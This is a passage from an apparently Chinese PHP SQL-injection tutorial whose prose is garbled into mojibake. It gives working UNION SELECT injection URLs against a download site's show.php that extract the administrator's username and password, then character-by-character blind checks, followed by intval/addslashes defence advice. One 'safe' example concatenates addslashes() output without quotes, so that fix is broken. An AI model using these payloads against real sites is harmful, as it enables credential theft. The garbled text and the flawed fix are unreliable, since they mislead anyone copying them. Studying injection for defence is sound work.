1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1</span></p></td></tr></tbody></table></div><p>ã€€ã€€å¿˜è®°äº†ï¼Œå°±ç®—ä¸å­˜åœ¨idä¸º1çš„ç”¨æˆ·ï¼Œå‰é¢çš„æŸ¥è¯¢æ˜¯çœŸçš„ï¼Œç…§æ ·ä¼šæ­£å¸¸è¿”å›æ•°æ®åº“çš„è½¯ä»¶ä¿¡æ¯ï¼Œæˆ‘ä»¬åªèƒ½è®©å‰é¢çš„æŸ¥è¯¢ä¸ºå‡ï¼Œæ‰èƒ½ä½¿åé¢æŸ¥è¯¢çš„ç»“æœæ˜¾ç¤ºå‡ºæ¥ï¼Œä½†æˆ‘ä»¬è¦æ³¨æ„ä¸€ç‚¹ï¼Œshow.phpæ–‡ä»¶é‡Œé¢æœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">if ($id &gt; "0" &amp;&amp; $id &lt; "999999999" ):<br />//è¿™é‡Œæ˜¯æ­£ç¡®æ‰§è¡Œçš„ä»£ç <br />else:<br />echo "&lt;p&gt;&lt;center&gt;&lt;a href=./list.php&gt;æ— è®°å½•&lt;/a&gt;&lt;/p&gt;\n";</span></p></td></tr></tbody></table></div><p>ã€€ã€€ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„IDçš„å€¼å†æ€ä¹ˆç¦»è°±ä¹Ÿä¸èƒ½åœ¨0å’Œ999999999ä¹‹å¤–ï¼ŒHBçš„è½¯ä»¶è‚¯å®šä¸ä¼šè¶…è¿‡10000ä¸ªçš„ï¼Œæˆ‘ä»¬å°±æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=10000 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1</span></p></td></tr></tbody></table></div><p>ã€€ã€€æ­£å¸¸è¿”å›äº†ï¼Œè¡¨æ ¼é‡Œçš„æ•°æ®å…¨éƒ¨æ˜¯â€œ1â€ï¼Œè¯´æ˜IDè¿˜åœ¨å“¦ã€‚å¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œé¡µé¢åªè¿”å›çš„æ•°æ®å…¨éƒ¨æ˜¯ä¸è¯¦ï¼Œå› ä¸ºç¨‹åºçš„åˆ¤æ–­æ˜¯å¦‚æœæ•°æ®ä¸ºç©ºå°±æ˜¾ç¤ºä¸è¯¦ã€‚ç°åœ¨ç¡®å®šäº†IDå­˜åœ¨åï¼Œè¿˜è¦ç¡®å®šæ˜¯ä¸æ˜¯ç®¡ç†å‘˜æ‰è¡Œå•Šï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=10000 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and groupid=1</span></p></td></tr></tbody></table></div><p>ã€€ã€€ç¨‹åºè§„å®šgroupidä¸º1æ˜¯è¶…çº§ç®¡ç†å‘˜ï¼Œæ—¢ç„¶éƒ½è¿”å›æ­£ç¡®ä¿¡æ¯äº†ï¼Œæˆ‘ä»¬å°±ç›´æ¥æ„é€ ç•¸å½¢è¯­å¥ï¼Œæš´å‡ºæˆ‘ä»¬éœ€è¦çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå˜¿å˜¿ï¼Œé¦–å…ˆçœ‹çœ‹ymdownè¡¨çš„æ•°æ®ç»“æ„ï¼Œå› ä¸ºshow.phpæ˜¯æŸ¥è¯¢å®ƒçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥çœ‹å®ƒçš„æ•°æ®ç»“æ„ã€‚</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">CREATE TABLE ymdown (<br />ã€€id int(10) unsigned NOT NULL auto_increment,<br />ã€€name varchar(100) NOT NULL,<br />ã€€updatetime varchar(20) NOT NULL,<br />ã€€size varchar(100) NOT NULL,<br />ã€€empower varchar(100) NOT NULL,<br />ã€€os varchar(100) NOT NULL,<br />ã€€grade smallint(6) DEFAULT '0' NOT NULL,<br />ã€€viewnum int(10) DEFAULT '0' NOT NULL,<br />ã€€downnum int(10) DEFAULT '0' NOT NULL,<br />ã€€homepage varchar(100), demo varchar(100),<br />ã€€brief mediumtext, img varchar(100),<br />ã€€sort2id smallint(6) DEFAULT '0' NOT NULL,<br />ã€€down1 varchar(100) NOT NULL,<br />ã€€down2 varchar(100),<br />ã€€down3 varchar(100),<br />ã€€down4 varchar(100),<br />ã€€down5 varchar(100),<br />ã€€PRIMARY KEY (id)<br />);</span></p></td></tr></tbody></table></div><p>ã€€ã€€ç”¨æˆ·åå’Œå¯†ç çš„æ•°æ®ç±»å‹éƒ½æ˜¯varcharï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€‰æ‹©ymdownè¡¨é‡Œæ•°æ®ç±»å‹æ˜¯varcharæ¥ï¼Œå¦‚æœæŠŠvarcharçš„æ•°æ®å†™åˆ°intçš„åœ°æ–¹å½“ç„¶æ˜¯ä¸å¯èƒ½æ˜¾ç¤ºçš„äº†ï¼Œç”±äºupdatetimeï¼ˆæ›´æ–°æ—¥æœŸï¼‰çš„é•¿åº¦æ˜¯20ï¼Œå¯èƒ½ä¼šå‡ºç°æ˜¾ç¤ºä¸å®Œå…¨çš„æƒ…å†µï¼Œæˆ‘ä»¬å°±æŠŠç”¨æˆ·åæ˜¾ç¤ºåœ¨nameï¼ˆè½¯ä»¶æ ‡é¢˜ï¼‰é‚£é‡Œï¼Œå¯†ç æ˜¾ç¤ºåœ¨sizeï¼ˆæ–‡ä»¶å¤§å°ï¼‰é‚£é‡Œå¥½äº†ï¼Œåœ¨19ä¸ªâ€œ1â€ä¸­ï¼Œnameå’Œsizeåˆ†åˆ«æ˜¯ç¬¬äºŒä¸ªå’Œç¬¬å››ä¸ªï¼Œæˆ‘ä»¬æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=10000 union select 1,username,1,password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1</span></p></td></tr></tbody></table></div><p>ã€€ã€€ç»“æœæˆåŠŸè¿”å›äº†æˆ‘ä»¬æ‰€éœ€è¦çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¦‚å›¾ï¼š</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="551" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php11.gif" width="662" style="border:0px;" /></p><p><span style="font-weight:700;">éªŒè¯æµ‹è¯•ç»“æœ</span></p><p>ã€€ã€€æ•´ä¸ªæ¸—é€è¿‡ç¨‹å°±ç»“æŸäº†ï¼Œä¸è¿‡ç”±äºé»‘ç™½æŠŠå…¥å£ç»™æ”¹äº†ï¼Œæ— æ³•ç™»é™†ï¼Œä½†æˆ‘ä»¬ä»…ä»…æµ‹è¯•æ³¨å…¥ï¼Œç›®çš„å·²ç»è¾¾åˆ°äº†ï¼Œå°±æ²¡æœ‰å¿…è¦è¿›åå°äº†ï¼Œæˆ‘åæ¥åˆç»§ç»­æ„é€ SQLè¯­å¥æ¥éªŒè¯æˆ‘ä»¬è·å–çš„å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œä¾æ¬¡æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,1,1))=49<br />#éªŒè¯ç¬¬ä¸€ä½å¯†ç <br />http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,2,1))=50<br />#éªŒè¯ç¬¬äºŒä½å¯†ç <br />http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,3,1))=51<br />#éªŒè¯ç¬¬ä¸‰ä½å¯†ç <br />http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,4,1))=52<br />#éªŒè¯ç¬¬å››ä½å¯†ç <br />http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,5,1))=53<br />#éªŒè¯ç¬¬äº”ä½å¯†ç <br />http://127.0.0.1/ymdown/show.php?id=10 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,6,1))=54<br />#éªŒè¯ç¬¬å…­ä½å¯†ç </span></p></td></tr></tbody></table></div><p>ã€€ã€€ç”¨select char(49,50,51,52,53,54)å°±å¯ä»¥å¾—åˆ°123456ã€‚<br />ã€€ã€€OKï¼æµ‹è¯•ç»“æŸï¼ŒéªŒè¯æˆ‘ä»¬çš„ç»“æœæ²¡æœ‰é”™è¯¯ã€‚è¯´æ˜ä¸€ä¸‹ï¼Œå¯†ç æœ¬èº«æ˜¯123456ï¼Œå¯ä»¥ä¸ç”¨ord()å‡½æ•°è€Œç›´æ¥çŒœï¼Œä½†ä¸ºäº†å¤§å®¶èƒ½çœ‹åˆ°ä¸€ä¸ªå®Œæ•´çš„è¿‡ç¨‹ï¼Œæˆ‘è¿˜æ˜¯â€œä¸“ä¸šâ€ä¸€ç‚¹å¥½äº†ã€‚ä¸‹é¢è¡¥ä¸€å¹…æˆªå›¾ï¼Œæ˜¯æœ¬æ–‡å†™å®Œåï¼Œé‡æ–°æµ‹è¯•HBæ—¶æˆªå–çš„ï¼š</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="531" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php12.gif" width="612" style="border:0px;" /></p><p><span style="font-weight:700;">æ³¨å…¥çš„é˜²èŒƒ</span></p><p>ã€€ã€€é˜²èŒƒå¯ä»¥ä»ä¸¤ä¸ªæ–¹é¢ç€æ‰‹ï¼Œä¸€ä¸ªå°±æ˜¯æœåŠ¡å™¨ï¼ŒäºŒä¸ªå°±æ˜¯ä»£ç æœ¬èº«ï¼Œä»‹ç»æœåŠ¡å™¨é…ç½®çš„æ–‡ç« å¾ˆå¤šäº†ï¼Œæ— éå°±æ˜¯æŠŠmagic_quotes_gpcè®¾ç½®ä¸ºOnï¼Œdisplay_errorsè®¾ç½®ä¸ºOffï¼Œè¿™é‡Œä¹Ÿå°±ä¸åœ¨å¤šè¯´ï¼Œæ—¢ç„¶æœ¬æ–‡æ¥è§¦éƒ½æ˜¯ç¨‹åºçš„é—®é¢˜ï¼Œæˆ‘ä»¬è¿˜æ˜¯ä»ç¨‹åºæœ¬èº«å¯»æ‰¾åŸå› ã€‚<br />ã€€ã€€å¦‚æœè¯´phpæ¯”aspæ˜“ç”¨ï¼Œå®‰å…¨ï¼Œä»å†…ç½®çš„å‡½æ•°å°±å¯ä»¥ä½“ç°å‡ºæ¥ã€‚å¦‚æœæ˜¯æ•´å½¢çš„å˜é‡ï¼Œåªéœ€ä½¿ç”¨ä¸€ä¸ªintval()å‡½æ•°å³å¯è§£å†³é—®é¢˜ï¼Œåœ¨æ‰§è¡ŒæŸ¥è¯¢ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå¤„ç†ä¸€ä¸‹å˜é‡ï¼Œå¦‚ä¸‹é¢çš„ä¾‹å­å°±æ˜¯å¾ˆå®‰å…¨çš„äº†ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">$id = intval($id);<br />mysql_query("SELECT * FROM article WHERE articleid='$id'");</span></p></td></tr></tbody></table></div><p>ã€€ã€€æˆ–è€…è¿™æ ·å†™ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">mysql_query("SELECT * FROM article WHERE articleid=".intval($id)."")</span></p></td></tr></tbody></table></div><p>ã€€ã€€ä¸ç®¡å¦‚ä½•æ„é€ ï¼Œæœ€ç»ˆè¿˜æ˜¯ä¼šå…ˆè½¬æ¢ä¸ºæ•´å½¢çŒœæ”¾å…¥æ•°æ®åº“çš„ã€‚å¾ˆå¤šå¤§å‹ç¨‹åºéƒ½æ˜¯è¿™æ ·å†™ï¼Œéå¸¸ç®€æ´ã€‚<br />ã€€ã€€å­—ç¬¦ä¸²å½¢çš„å˜é‡ä¹Ÿå¯ä»¥ç”¨addslashes()æ•´ä¸ªå†…ç½®å‡½æ•°äº†ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨å’Œmagic_quotes_gpcä¸€æ ·ï¼Œä½¿ç”¨åï¼Œæ‰€æœ‰çš„ ' (å•å¼•å·), " (åŒå¼•å·), \ (åæ–œçº¿) and ç©ºå­—ç¬¦ä¼šè‡ªåŠ¨è½¬ä¸ºå«æœ‰åæ–œçº¿çš„æº¢å‡ºå­—ç¬¦ã€‚è€Œä¸”æ–°ç‰ˆæœ¬çš„phpï¼Œå°±ç®—magic_quotes_gpcæ‰“å¼€äº†ï¼Œå†ä½¿ç”¨addslashes()å‡½æ•°ï¼Œä¹Ÿä¸ä¼šæœ‰å†²çªï¼Œå¯ä»¥æ”¾å¿ƒä½¿ç”¨ã€‚ä¾‹å­å¦‚ä¸‹ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">$username = addslashes($username);<br />mysql_query("SELECT * FROM members WHERE userid='$username'");</span></p></td></tr></tbody></table></div><p>ã€€ã€€æˆ–è€…è¿™æ ·å†™ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">mysql_query("SELECT * FROM members WHERE userid=".addslashes($username)."")</span></p></td></tr></tbody></table></div><p>ã€€ã€€ä½¿ç”¨addslashes()å‡½æ•°è¿˜å¯ä»¥é¿å…å¼•å·é…å¯¹é”™è¯¯çš„æƒ…å†µå‡ºç°ã€‚è€Œåˆšæ‰çš„å‰é¢æœç´¢å¼•æ“çš„ä¿®è¡¥æ–¹æ³•å°±æ˜¯ç›´æ¥æŠŠâ€œ_â€ã€â€œ%â€è½¬æ¢ä¸ºâ€œ\_â€â€œ\%â€å°±å¯ä»¥äº†ï¼Œå½“ç„¶ä¹Ÿä¸è¦å¿˜è®°ä½¿ç”¨addslashes()å‡½æ•°ã€‚å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">$keywords = addslashes($keywords);<br />$keywords = str_replace("_","\_",$keywords);<br />$keywords = str_replace("%","\%",$keywords);</span></p></td></tr></tbody></table></div><p>ã€€ã€€ä¸ç”¨åƒASPé‚£æ ·ï¼Œè¿‡æ»¤ä¸€ç‚¹å˜é‡ï¼Œå°±è¦å†™ä¸€å¤§å †çš„ä»£ç ï¼Œå°±æ˜¯ä¸Šé¢çš„ä¸€ç‚¹ç‚¹ä»£ç ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠæœ¬æ–‡æ‰€æœ‰çš„é—®é¢˜è§£å†³äº†ï¼Œæ˜¯ä¸æ˜¯å¾ˆç®€ä¾¿ï¼Ÿ</p><p>&nbsp;</p>                                    </div>
:ET